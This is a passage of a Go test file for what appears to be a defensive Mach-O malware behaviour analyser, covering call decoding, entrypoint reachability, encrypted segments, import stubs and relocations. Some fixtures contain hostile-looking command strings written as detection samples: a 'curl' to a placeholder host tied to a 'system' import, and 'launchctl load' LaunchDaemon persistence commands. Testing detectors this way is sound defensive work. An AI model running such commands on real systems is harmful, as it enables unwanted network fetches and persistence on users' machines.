	if len(graph.Operations) != 0 {
		t.Fatalf("decoder failure produced a semantic call: %#v", graph.Operations)
	}
	foundCoverage := false
	for _, coverage := range graph.Coverage {
		if coverage.AnalysisArea == "macho-x86-direct-call-decode/x86_64" && coverage.Status == "partial" && strings.Contains(coverage.Detail, "no byte resynchronization") {
			foundCoverage = true
		}
	}
	if !foundCoverage {
		t.Fatalf("decode failure was not disclosed as partial coverage: %#v", graph.Coverage)
	}
}

func TestX86DecoderPanicBoundaryTreatsMalformedEVEXAsFailure(t *testing.T) {
	if _, err := decodeX86Instruction([]byte{0x62, 0xff, 0xff, 0xff}); err == nil {
		t.Fatal("malformed/truncated EVEX input should fail closed")
	}
}

func TestDataInCodeIntervalsSuppressCallDecoding(t *testing.T) {
	data := append(encodeTestX86CALL(0x1000, 0x1010), bytes.Repeat([]byte{0x90}, 12)...)
	functions := []machoFunction{
		{Name: "main", Start: 0x1000, End: 0x1010},
		{Name: "helper", Start: 0x1010, End: 0x1011},
	}
	edges, incomplete := x86LocalCallEdgesBoundedWithRanges(0x1000, data, functions, len(data), 10, 10, []machoCodeRange{{start: 0, end: 5}})
	if incomplete || len(edges) != 0 {
		t.Fatalf("LC_DATA_IN_CODE bytes produced a call edge: edges=%#v incomplete=%v", edges, incomplete)
	}
}

func TestLocalCallEdgesRequireExactRecoveredFunctionStart(t *testing.T) {
	functions := []machoFunction{
		{Name: "caller", Start: 0x1000, End: 0x1010},
		{Name: "callee", Start: 0x1010, End: 0x1020},
	}
	if _, ok := localCallEdgeFor(functions, 0x1004, 0x1014); ok {
		t.Fatal("branch to an interior label was promoted to a function-call edge")
	}
	if edge, ok := localCallEdgeFor(functions, 0x1004, 0x1010); !ok || edge != (localCallEdge{caller: 0, callee: 1}) {
		t.Fatalf("exact function-start positive control failed: %#v, %v", edge, ok)
	}
}

func TestMachODataInCodeCommandProducesTextRelativeRanges(t *testing.T) {
	raw := make([]byte, 16)
	binary.LittleEndian.PutUint32(raw[0:4], lcDataInCode)
	binary.LittleEndian.PutUint32(raw[4:8], uint32(len(raw)))
	binary.LittleEndian.PutUint32(raw[8:12], 24)
	binary.LittleEndian.PutUint32(raw[12:16], 8)
	image := make([]byte, 32)
	binary.LittleEndian.PutUint32(image[24:28], 0x44)
	binary.LittleEndian.PutUint16(image[28:30], 5)
	file := &macho.File{ByteOrder: binary.LittleEndian, Loads: []macho.Load{macho.LoadBytes(raw)}}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Offset: 0x40, Size: 0x20}}

	ranges, present, err := machoDataInCodeRanges(file, text, image, 0x20)
	if err != nil || !present || len(ranges) != 1 || ranges[0] != (machoCodeRange{start: 4, end: 9}) {
		t.Fatalf("machoDataInCodeRanges() = %#v, %v, %v", ranges, present, err)
	}
}

func TestEncryptedMachOTextIsNeverDecoded(t *testing.T) {
	makeFile := func(cryptID uint32, data []byte) *macho.File {
		encryption := make([]byte, 24)
		binary.LittleEndian.PutUint32(encryption[0:4], lcEncryptionInfo64)
		binary.LittleEndian.PutUint32(encryption[4:8], uint32(len(encryption)))
		binary.LittleEndian.PutUint32(encryption[8:12], 0)
		binary.LittleEndian.PutUint32(encryption[12:16], uint32(len(data)))
		binary.LittleEndian.PutUint32(encryption[16:20], cryptID)
		entry := make([]byte, 24)
		binary.LittleEndian.PutUint32(entry[0:4], lcMain)
		binary.LittleEndian.PutUint32(entry[4:8], uint32(len(entry)))
		text := &macho.Section{
			SectionHeader: macho.SectionHeader{Name: "__text", Seg: "__TEXT", Addr: 0x1000, Size: uint64(len(data)), Offset: 0},
			ReaderAt:      bytes.NewReader(data),
		}
		return &macho.File{
			FileHeader: macho.FileHeader{Cpu: macho.CpuAmd64, Type: macho.TypeExec},
			ByteOrder:  binary.LittleEndian,
			Loads: []macho.Load{
				&macho.Segment{SegmentHeader: macho.SegmentHeader{Name: "__TEXT", Addr: 0x1000, Memsz: uint64(len(data)), Filesz: uint64(len(data)), Prot: 0x5}},
				macho.LoadBytes(encryption),
				macho.LoadBytes(entry),
			},
			Sections: []*macho.Section{text},
			Symtab: &macho.Symtab{Syms: []macho.Symbol{
				{Name: "_main", Type: 0x0e, Sect: 1, Value: 0x1000},
				{Name: "_helper", Type: 0x0e, Sect: 1, Value: 0x1010},
			}},
		}
	}
	data := append(encodeTestX86CALL(0x1000, 0x1010), bytes.Repeat([]byte{0x90}, 12)...)
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}

	var encrypted behavior.Graph
	extractMachOFile(&encrypted, content, makeFile(1, data), "x86_64", data, artifact.Options{})
	for _, feature := range encrypted.Features {
		if feature.Key == "macho.function_call" || feature.Key == "macho.import_call" {
			t.Fatalf("ciphertext produced executable-code feature: %#v", feature)
		}
	}
	if len(encrypted.Operations) != 0 || len(encrypted.Scopes) != 0 {
		t.Fatalf("ciphertext produced function-scoped behavior: scopes=%#v operations=%#v", encrypted.Scopes, encrypted.Operations)
	}
	foundCoverage := false
	for _, coverage := range encrypted.Coverage {
		if coverage.AnalysisArea == "macho-byte-analysis/x86_64" && coverage.Status == "partial" && strings.Contains(coverage.Detail, "skipped byte-derived") {
			foundCoverage = true
		}
	}
	if !foundCoverage {
		t.Fatalf("encrypted slice did not disclose skipped byte analysis: %#v", encrypted.Coverage)
	}

	var plaintext behavior.Graph
	extractMachOFile(&plaintext, content, makeFile(0, data), "x86_64", data, artifact.Options{})
	if !localCallFeatureExists(&plaintext, "node-1", "x86_64", "main", "helper") {
		t.Fatalf("unencrypted positive control lost valid local-call analysis: %#v", plaintext.Features)
	}
}

func TestMachOLCMainReachabilityTraversesPremarkedEntrypoint(t *testing.T) {
	rawMain := make([]byte, 24)
	binary.LittleEndian.PutUint32(rawMain[0:4], lcMain)
	binary.LittleEndian.PutUint32(rawMain[4:8], 24)
	file := &macho.File{
		FileHeader: macho.FileHeader{Cpu: macho.CpuAmd64, Type: macho.TypeExec},
		ByteOrder:  binary.LittleEndian,
		Loads: []macho.Load{
			&macho.Segment{SegmentHeader: macho.SegmentHeader{Offset: 0, Filesz: 0x100, Addr: 0x1000}},
			macho.LoadBytes(rawMain),
		},
	}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000}}
	data := []byte{
		0xe8, 0x01, 0x00, 0x00, 0x00, // LC_MAIN function calls helper at 0x1006.
		0xc3,
		0xc3,
	}
	functions := []machoFunction{
		{Name: "sub_1000", Start: 0x1000, End: 0x1006},
		{Name: "helper", Start: 0x1006, End: 0x1007},
	}

	markReachableFunctions(file, text, data, functions)
	if !functions[0].Entrypoint || !functions[0].Reachable || !functions[1].Reachable {
		t.Fatalf("LC_MAIN reachability should traverse the premarked entrypoint: %#v", functions)
	}
}

func TestMachOLCMainSeedingHonorsArtifactExecutionContext(t *testing.T) {
	rawMain := make([]byte, 24)
	binary.LittleEndian.PutUint32(rawMain[0:4], lcMain)
	binary.LittleEndian.PutUint32(rawMain[4:8], uint32(len(rawMain)))
	file := &macho.File{
		FileHeader: macho.FileHeader{Cpu: macho.CpuAmd64, Type: macho.TypeExec},
		ByteOrder:  binary.LittleEndian,
		Loads: []macho.Load{
			&macho.Segment{SegmentHeader: macho.SegmentHeader{Offset: 0, Filesz: 0x100, Addr: 0x1000}},
			macho.LoadBytes(rawMain),
		},
	}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000}}
	data := []byte{
		0xe8, 0x01, 0x00, 0x00, 0x00, // Process entry calls helper at 0x1006.
		0xc3,
		0xc3,
	}

	tests := []struct {
		name            string
		seed            machoExecutionSeed
		wantEntrypoint  bool
		wantMainReach   bool
		wantHelperReach bool
	}{
		{name: "root", seed: machoExecutionSeedRoot, wantEntrypoint: true, wantMainReach: true, wantHelperReach: true},
		{name: "local entry", seed: machoExecutionSeedLocalEntry, wantMainReach: true, wantHelperReach: true},
		{name: "unconnected", seed: machoExecutionSeedNone},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			functions := []machoFunction{
				{Name: "sub_1000", Start: 0x1000, End: 0x1006},
				{Name: "helper", Start: 0x1006, End: 0x1007},
			}
			markReachableFunctionsWithRangesDetailedSeeded(file, text, data, functions, nil, tt.seed)
			if functions[0].Entrypoint != tt.wantEntrypoint || functions[0].Reachable != tt.wantMainReach || functions[1].Reachable != tt.wantHelperReach {
				t.Fatalf("seeded functions = %#v", functions)
			}
		})
	}
}

func TestMachOExecutionSeedPreservesLocalAnalysisWithoutInventingRoot(t *testing.T) {
	tests := []struct {
		name    string
		content artifact.Content
		want    machoExecutionSeed
	}{
		{name: "direct extractor fixture", content: artifact.Content{}, want: machoExecutionSeedRoot},
		{name: "connected root", content: artifact.Content{ExecutionConnectivity: string(behavior.ConnectivityConnected), ExecutionRootIDs: []string{"root-1"}}, want: machoExecutionSeedRoot},
		{name: "connected target", content: artifact.Content{ExecutionConnectivity: string(behavior.ConnectivityConnected), ExecutionRootIDs: []string{"root-1"}, InvokedTargetIDs: []string{"target-1"}}, want: machoExecutionSeedLocalEntry},
		{name: "unconnected", content: artifact.Content{ExecutionConnectivity: string(behavior.ConnectivityUnconnected)}, want: machoExecutionSeedLocalEntry},
		{name: "unknown", content: artifact.Content{ExecutionConnectivity: string(behavior.ConnectivityUnknown)}, want: machoExecutionSeedLocalEntry},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := machoExecutionSeedForContent(tt.content); got != tt.want {
				t.Fatalf("seed = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestDuplicateMachOFunctionNamesRemainDistinctCorrelationScopes(t *testing.T) {
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Symtab: &macho.Symtab{Syms: []macho.Symbol{
			{Name: "_helper", Type: 0x0e, Sect: 1, Value: 0x1000},
			{Name: "_helper", Type: 0x0e, Sect: 1, Value: 0x1100},
		}},
	}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: 0x200}}
	functions, _, _ := functionRangesBounded(file, text, 1, nil)
	if len(functions) != 2 || functions[0].Name == functions[1].Name {
		t.Fatalf("duplicate symbol names were not isolated by address: %#v", functions)
	}

	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	evidence := graph.AddEvidence(behavior.Evidence{NodeID: content.NodeID, Method: "test", Kind: "shell-command", Value: "curl https://example.invalid"})
	graph.AddFeature(behavior.Feature{
		NodeID:         content.NodeID,
		Architecture:   "x86_64",
		Key:            "macho.shell_command",
		Value:          "curl https://example.invalid",
		EvidenceIDs:    []string{evidence},
		Support:        behavior.SupportCorroborated,
		SourceFunction: functions[0].Name,
		Qualifiers:     map[string]string{"function": functions[0].Name},
	})
	addOperationFromCalledImportedSymbol(&graph, content, "_system", "x86_64", "ev-call", functions[1])
	for _, feature := range graph.Features {
		if feature.Key == "macho.shell_command_expanded" {
			t.Fatalf("same display symbol at another address was cross-correlated: %#v", graph.Features)
		}
	}
}

func TestLCMainBecomesBoundaryInStrippedMachO(t *testing.T) {
	rawMain := make([]byte, 24)
	binary.LittleEndian.PutUint32(rawMain[0:4], lcMain)
	binary.LittleEndian.PutUint32(rawMain[4:8], uint32(len(rawMain)))
	binary.LittleEndian.PutUint64(rawMain[8:16], 0x10)
	file := &macho.File{
		FileHeader: macho.FileHeader{Cpu: macho.CpuAmd64, Type: macho.TypeExec},
		ByteOrder:  binary.LittleEndian,
		Loads: []macho.Load{
			&macho.Segment{SegmentHeader: macho.SegmentHeader{Offset: 0, Filesz: 0x100, Addr: 0x1000}},
			macho.LoadBytes(rawMain),
		},
	}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: 0x30}}
	functions, _, _ := functionRangesBounded(file, text, 1, nil)
	if len(functions) != 1 || functions[0].Start != 0x1010 {
		t.Fatalf("LC_MAIN was not used as the stripped function boundary: %#v", functions)
	}
	markEntrypointFunction(file, functions)
	if !functions[0].Entrypoint {
		t.Fatalf("LC_MAIN boundary was not seeded as entrypoint: %#v", functions)
	}
}

func TestMainSymbolInDylibIsNotAnEntrypoint(t *testing.T) {
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000}}
	for _, fileType := range []macho.Type{macho.TypeDylib, macho.TypeExec} {
		file := &macho.File{FileHeader: macho.FileHeader{Cpu: macho.CpuAmd64, Type: fileType}}
		functions := []machoFunction{{Name: "main", Start: 0x1000, End: 0x1001}}
		markReachableFunctions(file, text, []byte{0xc3}, functions)
		if functions[0].Entrypoint || functions[0].Reachable {
			t.Fatalf("name-only main symbol was promoted to entrypoint for %v: %#v", fileType, functions)
		}
	}
}

func TestMachOLocalCallEdgeWorkCaps(t *testing.T) {
	data := make([]byte, 21)
	copy(data[0:], encodeTestX86CALL(0, 20))
	copy(data[5:], encodeTestX86CALL(5, 20))
	functions := []machoFunction{
		{Name: "main", Start: 0, End: 20},
		{Name: "helper", Start: 20, End: 21},
	}

	edges, truncated := x86LocalCallEdgesBoundedWithRanges(0, data, functions, len(data), 1, 10, nil)
	if !truncated || len(edges) != 1 {
		t.Fatalf("candidate cap result = %#v, %v; want one edge and partial coverage", edges, truncated)
	}
	edges, truncated = x86LocalCallEdgesBoundedWithRanges(0, data, functions, len(data), 10, 0, nil)
	if !truncated || len(edges) != 0 {
		t.Fatalf("edge cap result = %#v, %v; want no retained edges and partial coverage", edges, truncated)
	}
}

func TestMachODirectCallExtroperationStopsAtCandidateCap(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	file := &macho.File{FileHeader: macho.FileHeader{Cpu: macho.CpuAmd64}, ByteOrder: binary.LittleEndian}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0}}
	data := make([]byte, 21)
	copy(data[0:], encodeTestX86CALL(0, 20))
	copy(data[5:], encodeTestX86CALL(5, 20))
	functions := []machoFunction{
		{Name: "main", Start: 0, End: 20},
		{Name: "helper", Start: 20, End: 21},
	}
	lookup := newMachOCallLookup(&graph, content, "x86_64")

	count, truncated := extractX86DirectCallsIndexed(lookup, file, text, data, functions, nil, nil, len(data), 1)
	if !truncated || count != 1 || len(graph.Features) != 1 {
		t.Fatalf("bounded direct extraction count=%d truncated=%v features=%#v", count, truncated, graph.Features)
	}
}

func TestMachODirectLocalCallAddsFunctionCallFeature(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{
		NodeID: "node-1", LogicalPath: "sample",
		ExecutionConnectivity: string(behavior.ConnectivityConnected), ExecutionRootIDs: []string{"root-1"},
	}
	file := &macho.File{FileHeader: macho.FileHeader{Cpu: macho.CpuAmd64}}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000}}
	data := []byte{
		0xe8, 0x01, 0x00, 0x00, 0x00, // main calls helper at 0x1006
		0xc3,
		0xc3,
	}
	functions := []machoFunction{
		{Name: "main", Start: 0x1000, End: 0x1006, Reachable: true},
		{Name: "helper", Start: 0x1006, End: 0x1007},
	}

	count := extractX86DirectCalls(&graph, content, file, text, data, functions, nil, nil, "x86_64")
	if count != 1 {
		t.Fatalf("extractX86DirectCalls() count = %d, want 1", count)
	}
	if len(graph.Features) != 1 || graph.Features[0].Key != "macho.function_call" || graph.Features[0].Value != "helper" || graph.Features[0].SourceFunction != "main" || graph.Features[0].Architecture != "x86_64" {
		t.Fatalf("missing scoped Mach-O function call feature: %#v", graph.Features)
	}
	if graph.Features[0].Execution.Connectivity != behavior.ConnectivityConnected || !slices.Equal(graph.Features[0].Execution.ExecutionRootIDs, []string{"root-1"}) {
		t.Fatalf("function-call feature lost connected caller ownership: %#v", graph.Features[0])
	}
	if len(graph.Evidence) != 1 || graph.Evidence[0].Function != "main" || graph.Evidence[0].VA != 0x1000 || graph.Evidence[0].Arch != "x86_64" {
		t.Fatalf("missing function call evidence location: %#v", graph.Evidence)
	}
}

func TestMachODirectLocalCallDeduplicatesCallerCalleeFeatures(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	file := &macho.File{FileHeader: macho.FileHeader{Cpu: macho.CpuAmd64}}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000}}
	data := []byte{
		0xe8, 0x06, 0x00, 0x00, 0x00, // main calls helper at 0x100b
		0xe8, 0x01, 0x00, 0x00, 0x00, // main calls helper at 0x100b again
		0xc3,
		0xc3,
	}
	functions := []machoFunction{
		{Name: "main", Start: 0x1000, End: 0x100b},
		{Name: "helper", Start: 0x100b, End: 0x100c},
	}

	count := extractX86DirectCalls(&graph, content, file, text, data, functions, nil, nil, "x86_64")
	if count != 1 || len(graph.Features) != 1 {
		t.Fatalf("duplicate direct calls should produce one caller/callee feature, count=%d features=%#v", count, graph.Features)
	}
}

func TestMachODirectLocalCallCorrelationCapIsExplicit(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	lookup := newMachOCallLookup(&graph, content, "x86_64")
	for i := 0; i < maxMachOFunctionCallFeatures; i++ {
		lookup.localCalls[machoCallPair{caller: fmt.Sprintf("caller-%d", i), callee: "callee"}] = true
	}
	functions := []machoFunction{
		{Name: "main", Start: 0x1000, End: 0x1006},
		{Name: "helper", Start: 0x1006, End: 0x1007},
	}
	if addLocalCallFeatureIndexed(lookup, functions, 0x1000, 0x1006) {
		t.Fatal("call beyond the correlation cap should not add a feature")
	}
	if len(graph.Features) != 0 || len(graph.Evidence) != 0 {
		t.Fatalf("capped call should not consume graph or evidence budget: features=%#v evidence=%#v", graph.Features, graph.Evidence)
	}
	if len(graph.Coverage) != 1 || graph.Coverage[0].AnalysisArea != "macho-call-correlation/x86_64" || graph.Coverage[0].Status != "partial" {
		t.Fatalf("missing explicit call-correlation coverage: %#v", graph.Coverage)
	}
}

func TestMachODirectLocalCallCorrelationReservesApplicationCapacity(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	lookup := newMachOCallLookup(&graph, content, "x86_64")
	for i := 0; i < maxMachOGoRuntimeCallFeatures; i++ {
		lookup.localCalls[machoCallPair{caller: fmt.Sprintf("runtime-%d", i), callee: "callee"}] = true
		lookup.localCallOrigins["go-runtime-compiler"]++
	}
	runtimeFunctions := []machoFunction{
		{Name: "runtime.extra", Start: 0x1000, End: 0x1006, Metadata: "go-runtime-compiler"},
		{Name: "runtime.target", Start: 0x1006, End: 0x1007, Metadata: "go-runtime-compiler"},
	}
	if addLocalCallFeatureIndexed(lookup, runtimeFunctions, 0x1000, 0x1006) {
		t.Fatal("runtime call beyond its reserved cap should not crowd out other origins")
	}
	applicationFunctions := []machoFunction{
		{Name: "main.collect", Start: 0x2000, End: 0x2006, Metadata: "go-other"},
		{Name: "main.upload", Start: 0x2006, End: 0x2007, Metadata: "go-other"},
	}
	if !addLocalCallFeatureIndexed(lookup, applicationFunctions, 0x2000, 0x2006) {
		t.Fatal("application call should retain capacity after the runtime quota is full")
	}
	if len(graph.Features) != 1 || graph.Features[0].SourceFunction != "main.collect" || graph.Features[0].Value != "main.upload" {
		t.Fatalf("reserved application feature = %#v", graph.Features)
	}
}

func TestReachableMachOLaunchctlStringDoesNotBecomeOperation(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "Sample.app/Contents/MacOS/Sample"}
	lookup := newMachOCallLookup(&graph, content, "x86_64")
	functions := []machoFunction{
		{Name: "loadService", Start: 0x1000, End: 0x1100, Reachable: true},
		{Name: "unloadService", Start: 0x1100, End: 0x1200, Reachable: true},
		{Name: "unusedLoad", Start: 0x1200, End: 0x1300},
	}
	for index, item := range []struct {
		function machoFunction
		command  string
	}{
		{functions[0], "launchctl load -F %s"},
		{functions[1], "launchctl unload -F"},
		{functions[2], "launchctl load /Library/LaunchDaemons/com.example.test.plist"},
	} {
		addMachOStringXrefIndexed(lookup, machoStringXref{
			RefVA:    uint64(0x1010 + index),
			Function: item.function,
			Literal:  machoStringLiteral{VA: uint64(0x3000 + index*0x100), Offset: 80 + index, Kind: "shell-command", Value: item.command},
		})
	}

	if len(graph.Operations) != 0 {
		t.Fatalf("reachable command-string xrefs without a recovered invocation became operations: %#v", graph.Operations)
	}
	if !lookup.featureExists(functions[0].Name, "macho.shell_command") {
		t.Fatal("neutral scoped command-string Feature was not retained")
	}
}

func TestImportedStubMapClampsDeclaredCountToIndirectSymbolsAndBudget(t *testing.T) {
	raw := make([]byte, 72+80)
	binary.LittleEndian.PutUint32(raw[0:4], uint32(macho.LoadCmdSegment64))
	binary.LittleEndian.PutUint32(raw[4:8], uint32(len(raw)))
	binary.LittleEndian.PutUint32(raw[64:68], 1)
	section := raw[72:]
	copy(section[0:16], "__stubs")
	binary.LittleEndian.PutUint64(section[32:40], 0x2000)
	binary.LittleEndian.PutUint64(section[40:48], ^uint64(0))
	binary.LittleEndian.PutUint32(section[64:68], 0x8)
	binary.LittleEndian.PutUint32(section[72:76], 1)
	file := &macho.File{
		FileHeader: macho.FileHeader{Cpu: macho.CpuAmd64},
		ByteOrder:  binary.LittleEndian,
		Loads:      []macho.Load{macho.LoadBytes(raw)},
		Symtab:     &macho.Symtab{Syms: []macho.Symbol{{Name: "_system", Type: 0x01}}},
		Dysymtab:   &macho.Dysymtab{DysymtabCmd: macho.DysymtabCmd{Iundefsym: 0, Nundefsym: 1}, IndirectSyms: []uint32{0}},
	}

	stubs, truncated := importedStubMapBounded(file, 10)
	if !truncated || len(stubs) != 1 || stubs[0x2000] != "_system" {
		t.Fatalf("bounded stub map = %#v, %v", stubs, truncated)
	}
}

func TestImportedStubMapRequiresUndefinedExternalAndTypedStubSection(t *testing.T) {
	fileFor := func(symbolType uint8, sectionType uint32) *macho.File {
		raw := make([]byte, 72+80)
		binary.LittleEndian.PutUint32(raw[0:4], uint32(macho.LoadCmdSegment64))
		binary.LittleEndian.PutUint32(raw[4:8], uint32(len(raw)))
		binary.LittleEndian.PutUint32(raw[64:68], 1)
		section := raw[72:]
		copy(section[0:16], "__stubs")
		binary.LittleEndian.PutUint64(section[32:40], 0x2000)
		binary.LittleEndian.PutUint64(section[40:48], 8)
		binary.LittleEndian.PutUint32(section[64:68], sectionType)
		binary.LittleEndian.PutUint32(section[72:76], 8)
		return &macho.File{
			FileHeader: macho.FileHeader{Cpu: macho.CpuAmd64},
			ByteOrder:  binary.LittleEndian,
			Loads:      []macho.Load{macho.LoadBytes(raw)},
			Symtab:     &macho.Symtab{Syms: []macho.Symbol{{Name: "_system", Type: symbolType}}},
			Dysymtab:   &macho.Dysymtab{DysymtabCmd: macho.DysymtabCmd{Iundefsym: 0, Nundefsym: 1}, IndirectSyms: []uint32{0}},
		}
	}
	if stubs, _ := importedStubMapBounded(fileFor(0x0f, 0x8), 10); len(stubs) != 0 {
		t.Fatalf("defined symbol acquired import-stub semantics: %#v", stubs)
	}
	if stubs, _ := importedStubMapBounded(fileFor(0x01, 0x0), 10); len(stubs) != 0 {
		t.Fatalf("section named __stubs without S_SYMBOL_STUBS acquired import semantics: %#v", stubs)
	}
	common := fileFor(0x01, 0x8)
	common.Symtab.Syms[0].Value = 8
	if stubs, _ := importedStubMapBounded(common, 10); len(stubs) != 0 {
		t.Fatalf("common/tentative symbol acquired import-stub semantics: %#v", stubs)
	}
	outsideUndefinedRange := fileFor(0x01, 0x8)
	outsideUndefinedRange.Dysymtab.Iundefsym = 1
	outsideUndefinedRange.Dysymtab.Nundefsym = 0
	if stubs, _ := importedStubMapBounded(outsideUndefinedRange, 10); len(stubs) != 0 {
		t.Fatalf("indirect symbol outside the dynamic undefined range acquired import semantics: %#v", stubs)
	}
	if stubs, _ := importedStubMapBounded(fileFor(0x01, 0x8), 10); stubs[0x2000] != "_system" {
		t.Fatalf("typed undefined-external stub positive was lost: %#v", stubs)
	}
}

func TestImportedPointerMapRequiresTypedUndefinedExternalSlots(t *testing.T) {
	load := testMachOIndirectSectionLoad("__got", "__DATA_CONST", 0x3000, 16, 0x6, 0, 0)
	file := &macho.File{
		FileHeader: macho.FileHeader{Cpu: macho.CpuAmd64},
		ByteOrder:  binary.LittleEndian,
		Loads:      []macho.Load{load},
		Symtab: &macho.Symtab{Syms: []macho.Symbol{
			{Name: "_objc_msgSend", Type: 0x01},
			{Name: "_system", Type: 0x01},
		}},
		Dysymtab: &macho.Dysymtab{DysymtabCmd: macho.DysymtabCmd{Iundefsym: 0, Nundefsym: 2}, IndirectSyms: []uint32{0, 1}},
	}
	pointers, truncated := importedPointerMapBounded(file, 10)
	if truncated || len(pointers) != 2 || pointers[0x3000] != "_objc_msgSend" || pointers[0x3008] != "_system" {
		t.Fatalf("typed indirect pointer map = %#v, truncated=%v", pointers, truncated)
	}
	pointers, truncated = importedPointerMapBounded(file, 1)
	if !truncated || len(pointers) != 1 || pointers[0x3000] != "_objc_msgSend" {
		t.Fatalf("bounded indirect pointer map = %#v, truncated=%v", pointers, truncated)
	}

	file.Loads = []macho.Load{testMachOIndirectSectionLoad("__got", "__DATA_CONST", 0x3000, 16, 0x0, 0, 0)}
	if pointers, _ := importedPointerMapBounded(file, 10); len(pointers) != 0 {
		t.Fatalf("untyped section acquired indirect-call semantics: %#v", pointers)
	}
	file.Loads = []macho.Load{load}
	file.Symtab.Syms[0].Type = 0x0f
	if pointers, _ := importedPointerMapBounded(file, 10); pointers[0x3000] != "" || pointers[0x3008] != "_system" {
		t.Fatalf("defined symbol acquired imported-pointer semantics: %#v", pointers)
	}
	file.Symtab.Syms[0].Type = 0x01
	file.Loads = []macho.Load{testMachOIndirectSectionLoad("__got", "__DATA_CONST", 0x3000, 10, 0x6, 0, 0)}
	if pointers, truncated := importedPointerMapBounded(file, 10); !truncated || len(pointers) != 1 || pointers[0x3000] != "_objc_msgSend" {
		t.Fatalf("malformed pointer-section remainder = %#v, truncated=%v", pointers, truncated)
	}
	file.Loads = []macho.Load{testMachOIndirectSectionLoad("__got", "__DATA_CONST", ^uint64(0)-3, 8, 0x6, 0, 0)}
	if pointers, truncated := importedPointerMapBounded(file, 10); !truncated || len(pointers) != 0 {
		t.Fatalf("overflowing pointer section = %#v, truncated=%v", pointers, truncated)
	}
}

func TestRelocatedImportCallsRequireUndefinedExternalSymbol(t *testing.T) {
	fixture := func(cpu macho.Cpu, data []byte, reloc macho.Reloc, symbol macho.Symbol, dataRanges []machoCodeRange) behavior.Graph {
		var graph behavior.Graph
		content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
		arch := "x86_64"
		if cpu == macho.CpuArm64 {
			arch = "arm64"
		}
		lookup := newMachOCallLookup(&graph, content, arch)
		text := testMachOSection("__text", 0x1000, data)
		text.Relocs = []macho.Reloc{reloc}
		file := &macho.File{
			FileHeader: macho.FileHeader{Cpu: cpu},
			ByteOrder:  binary.LittleEndian,
			Symtab:     &macho.Symtab{Syms: []macho.Symbol{symbol}},
		}
		extractRelocatedImportCallsIndexedWithRanges(lookup, file, text, []machoFunction{{Name: "main", Start: 0x1000, End: 0x1000 + uint64(len(data)), Reachable: true}}, 10, dataRanges)
		return graph
	}
	x86Call := []byte{0xe8, 0, 0, 0, 0, 0x90, 0x90, 0x90}
	x86Reloc := macho.Reloc{Addr: 1, Value: 0, Type: uint8(macho.X86_64_RELOC_BRANCH), Len: 2, Pcrel: true, Extern: true}
	defined := fixture(macho.CpuAmd64, x86Call, x86Reloc, macho.Symbol{Name: "_system", Type: 0x0f, Sect: 1, Value: 0x2000}, nil)
	if len(defined.Features) != 0 || len(defined.Operations) != 0 {
		t.Fatalf("defined relocation symbol acquired imported-call semantics: features=%#v operations=%#v", defined.Features, defined.Operations)
	}
	common := fixture(macho.CpuAmd64, x86Call, x86Reloc, macho.Symbol{Name: "_system", Type: 0x01, Value: 8}, nil)
	if len(common.Features) != 0 || len(common.Operations) != 0 {
		t.Fatalf("common/tentative relocation symbol acquired imported-call semantics: features=%#v operations=%#v", common.Features, common.Operations)
	}
	undefined := fixture(macho.CpuAmd64, x86Call, x86Reloc, macho.Symbol{Name: "_system", Type: 0x01}, nil)
	if len(undefined.Features) != 1 || undefined.Features[0].Key != "macho.import_call" || undefined.Features[0].Value != "system" || len(undefined.Operations) != 1 {
		t.Fatalf("undefined-external relocation positive was lost: features=%#v operations=%#v", undefined.Features, undefined.Operations)
	}
	if undefined.Evidence[0].VA != 0x1000 {
		t.Fatalf("x86 relocation evidence VA = %#x, want CALL opcode VA", undefined.Evidence[0].VA)
	}
	for _, test := range []struct {
		name       string
		cpu        macho.Cpu
		data       []byte
		reloc      macho.Reloc
		dataRanges []machoCodeRange
	}{
		{name: "x86 jump", cpu: macho.CpuAmd64, data: []byte{0xe9, 0, 0, 0, 0}, reloc: x86Reloc},
		{name: "x86 wrong width", cpu: macho.CpuAmd64, data: x86Call, reloc: func() macho.Reloc { r := x86Reloc; r.Len = 3; return r }()},
		{name: "x86 scattered", cpu: macho.CpuAmd64, data: x86Call, reloc: func() macho.Reloc { r := x86Reloc; r.Scattered = true; return r }()},
		{name: "x86 opcode underflow", cpu: macho.CpuAmd64, data: x86Call, reloc: func() macho.Reloc { r := x86Reloc; r.Addr = 0; return r }()},
		{name: "x86 truncated", cpu: macho.CpuAmd64, data: []byte{0xe8, 0, 0, 0}, reloc: x86Reloc},
		{name: "x86 operand in data", cpu: macho.CpuAmd64, data: x86Call, reloc: x86Reloc, dataRanges: []machoCodeRange{{start: 3, end: 4}}},
		{name: "arm branch not link", cpu: macho.CpuArm64, data: []byte{0, 0, 0, 0x14}, reloc: macho.Reloc{Addr: 0, Type: uint8(macho.ARM64_RELOC_BRANCH26), Len: 2, Pcrel: true, Extern: true}},
